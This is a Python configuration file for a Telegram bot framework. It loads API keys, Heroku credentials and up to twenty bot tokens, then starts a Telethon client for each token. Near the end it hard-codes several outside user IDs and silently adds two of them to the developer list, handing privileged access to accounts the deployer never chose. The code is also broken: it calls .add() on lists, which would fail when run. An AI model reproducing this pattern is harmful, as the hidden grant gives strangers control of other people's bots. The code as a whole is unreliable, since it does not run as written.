import logging
import os
import sys
from os import getenv
from decouple import config
import time
from datetime import datetime
from telethon import TelegramClient

StartTime = time.time()

# logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
OWNER_ID = config("OWNER_ID", cast=int)
OWNER_NAME = config("OWNER_NAME")
HEROKU_API_KEY = config("HEROKU_API_KEY", default=None)
HEROKU_APP_NAME  = config("HEROKU_APP_NAME", default=None)
HNDLR = config("HNDLR", default="/")
ALIVE_MESSAGE = config("ALIVE_MESSAGE")
Bot_Token1 = config("Bot_Token01", default=None)
Bot_Token2 = config("Bot_Token02", default=None)
Bot_Token3 = config("Bot_Token03", default=None)
Bot_Token4 = config("Bot_Token04", default=None)
Bot_Token5 = config("Bot_Token05", default=None)
Bot_Token6 = config("Bot_Token06", default=None)
Bot_Token7 = config("Bot_Token07", default=None)
Bot_Token8 = config("Bot_Token08", default=None)
Bot_Token9 = config("Bot_Token09", default=None)
Bot_Token10 = config("Bot_Token10", default=None)
Bot_Token11 = config("Bot_Token11", default=None)
Bot_Token12 = config("Bot_Token12", default=None)
Bot_Token13 = config("Bot_Token13", default=None)
Bot_Token14 = config("Bot_Token14", default=None)
Bot_Token15 = config("Bot_Token15", default=None)
Bot_Token16 = config("Bot_Token16", default=None)
Bot_Token17 = config("Bot_Token17", default=None)
Bot_Token18 = config("Bot_Token18", default=None)
Bot_Token19 = config("Bot_Token19", default=None)
Bot_Token20 = config("Bot_Token20", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
DEV_USERS = list(map(int, getenv("DEV_USERS").split()))

if Bot_Token1:
  Bot1 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token1)
else:
  Bot1 = None
if Bot_Token2:
  Bot2 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token2)
else:
  Bot2 = None
if Bot_Token3:
  Bot3 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token3)
else:
  Bot3 = None
if Bot_Token4:
  Bot4 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token4)
else:
  Bot4 = None
if Bot_Token5:
  Bot5 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token5)
else:
  Bot5 = None
if Bot_Token6:
  Bot6 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token6)
else:
  Bot6 = None
if Bot_Token7:
  Bot7 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token7)
else:
  Bot7 = None
if Bot_Token8:
  Bot8 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token8)
else:
  Bot8 = None
if Bot_Token9:
  Bot9 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token9)
else:
  Bot9 = None
if Bot_Token10:
  Bot10 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token10)
else:
  Bot10 = None
if Bot_Token11:
  Bot11 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token11)
else:
  Bot11 = None
if Bot_Token12:
  Bot12 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token12)
else:
  Bot12 = None
if Bot_Token13:
  Bot13 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token13)
else:
  Bot13 = None
if Bot_Token14:
  Bot14 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token14)
else:
  Bot14 = None
if Bot_Token15:
  Bot15 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token15)
else:
  Bot15 = None
if Bot_Token16:
  Bot16 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token16)
else:
  Bot16 = None
if Bot_Token17:
  Bot17 = TelegramClient('Bot', API_ID, API_HASH).start(bot_token=Bot_Token17)
else:
  Bot17 = None
if Bot_Token18:
  Bot18 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token18)
else:
  Bot18 = None
if Bot_Token19:
  Bot19 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token19)
else:
  Bot19 = None
if Bot_Token20:
  Bot20 = TelegramClient('Bot',  API_ID, API_HASH).start(bot_token=Bot_Token20)
else:
  Bot20 = None

SUDO_USERS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)

crew = [1818824488, 1787040289,1465589037, 1860999973]

SUDO_USERS = list(SUDO_USERS)
DEV_USERS = list(DEV_USERS)
DEV_USERS.append(1787040289)
DEV_USERS.append(1818824488)